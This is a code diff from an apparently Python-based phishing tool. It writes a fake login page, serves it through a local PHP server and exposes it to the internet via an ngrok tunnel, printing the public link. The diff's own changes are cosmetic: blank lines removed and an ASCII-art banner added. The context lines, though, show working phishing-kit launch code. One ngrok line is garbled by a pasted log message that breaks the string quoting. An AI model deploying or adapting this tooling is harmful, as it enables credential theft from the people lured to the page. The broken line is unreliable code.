@@ -500,20 +500,6 @@ span.language {
       </script>
     </body>
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
  </html>""")
     filedown = open("templates/phishing/login.html","w")
     filedown.write(path)
@@ -546,7 +532,28 @@ exit();""")
        try:
           with open("log","w") as phplog:
              Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)
-          bannner.banner()
+          print (Fore.BLUE+"""
+..............              
+            ..,;:ccc,.              
+          ......''';lxO.           
+.....''''..........,:ld;     
+           .';;;:::;,,.x,             
+      ..'''.            0Xxoc:,.  ...       
+  ....                ,ONkc;,;cokOdc',.     
+ .                   OMo           ':ddo.  
+                    dMc               :OO;  
+                    0M.                 .:o.  
+                    ;Wd
+                     ;XO,
+                       ,d0Odlc;,..
+                           ..',;:cdOOd::,.
+                                    .:d;.':;.
+                                       'd,  .'
+                                         ;l   ..
+                                          .o
+                                            c
+                                            .'
+                                             .""")
           global token
           a = ngrok.connect(6060,"http",auth_token=token).replace("lvl=warn msg="failed to get home directory, using $HOME instead" err="user: Current requires cgo or $USER set in environment" $HOME=/data/data/com.termux/files/home","")
           print("\n"+Fore.RED+" [~] URL 1 : "+Fore.BLUE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://").replace("-> https://localhost:6060",""))
